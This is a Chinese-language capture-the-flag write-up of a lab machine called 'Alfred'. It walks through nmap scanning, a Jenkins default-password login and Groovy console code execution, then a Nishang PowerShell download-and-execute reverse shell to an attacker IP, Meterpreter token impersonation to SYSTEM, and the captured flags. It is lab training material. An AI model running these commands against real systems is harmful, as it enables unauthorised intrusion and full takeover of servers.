# Alfred

在这个房间里，我们将学习如何利用广泛使用的自动化服务器上的常见错误配置（Jenkins - 此工具用于创建持续集成/持续开发管道，允许开发人员在更改代码后自动部署其代码）。之后，我们将使用一种有趣的权限提升方法来获得完整的系统访问权限。

由于这是一个Windows应用程序，我们将使用Nishinang来获得初始访问权限。存储库包含一组有用的脚本，用于初始访问、枚举和权限提升。在本例中，我们将使用反向 shell 脚本

---

循例 nm  扫

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nmap</font> <font color="#9755B3">-sV</font> 10.10.243.186 <font color="#9755B3">-Pn</font></pre>

这波不一样，需要加-Pn，否则扫不出来，因为题目说了机器禁ping

---

开了三个端口

    80/tcp   open  http       Microsoft IIS httpd 7.5
    3389/tcp open  tcpwrapped
    8080/tcp open  http       Jetty 9.4.z-SNAPSHOT

80端口的web只有一张图片，先到8080看看有没有东西

是一个登录页面，翻了一眼源代码和抓包，都没啥东西，似乎也没有sqli，

刚打算爆破，试了一下弱口令，还真成功了

    username: admin
    password: admin

有一处地方能够执行命令，查阅文档：https://www.jenkins.io/doc/book/managing/script-console/

文档中的一句话引起了我的注意：

    是Jenkins运行时中基于Web的Groovy shell。Groovy是一个非常 一种功能强大的语言，它提供了实际上做Java所能做的任何事情的能力 包括：

百度搜索groovy语言相关文档，最终发现 execute可以执行命令

    在groovy中只要把字符串后面调用execute方法就能执行字符串中的命令，当然前提条件是这个字符串是相应平台上的可执行命令

.

    "whoami".execute().text

成功，现在尝试reverse shell:

发现powershell是可用的，那就用它来getshell，构造payload:

常规的payload好像不行，看看nishang的github

    方法 1.使用内存中的下载并执行： 使用以下命令从远程 shell、meterpreter 本机 shell、Web shell 等执行 PowerShell 脚本及其导出的函数。尼尚中的所有脚本都会在当前 PowerShell 会话中导出具有相同名称的函数。

    powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]

使用之前先下载 https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

然后在攻击机上：

    python3 -m http.server

尝试rce 反弹shell:

    "powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.17.14:8000/windows-tools_and_exp/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.17.14 -Port 8888".execute()

成功

<pre>Ncat: Connection from 10.10.243.186.
Ncat: Connection from 10.10.243.186:49296.
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins&gt;
</pre>

<pre>PS C:\Users\bruce\Desktop&gt; type c:\users\bruce\desktop\user.txt
79007a09481963edf2e1321abd9ae2a0
</pre>

使用metasploit生成个metpreter的reverse shell然后利用rce将其下载到目标

    "powershell '(New-Object System.Net.WebClient).Downloadfile('http://10.11.17.14:8000/met_rev.exe','shell-name.exe')'".execute()

msfconsole> use exploit/multi/handler开启监听

在我们刚开始的reverse shell启动这个reverse shell：

    Start-Process "met_rev.exe"

meterpreter:

    load incognito 

    list_tokens -g 查看可用token

    impersonate_token "BUILTIN\Administrators"  使用token

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</pre>


即使您具有更高特权的令牌，您实际上也可能没有特权用户的权限（这是由于 Windows 处理权限的方式 - 它使用进程的主令牌而不是模拟令牌来确定进程可以或不能执行的操作）。确保迁移到具有正确权限的进程（上述问题已回答）。最安全的拣选过程是服务.exe过程。首先使用 ps 命令查看进程并查找服务.exe进程的 PID。使用命令迁移 PID 进程迁移到此进程

---

尝试转储到lsass.exe

<pre><u style="text-decoration-style:single">meterpreter</u> &gt; migrate 676
<font color="#277FFF"><b>[*]</b></font> Migrating from 2300 to 676...
<font color="#277FFF"><b>[*]</b></font> Migration completed successfully.
</pre>

shell

<pre>C:\Windows\system32&gt;type C:\Windows\system32\config\root.txt
type C:\Windows\system32\config\root.txt
dff0f748678f280250f25a45b8046b4a

</pre>
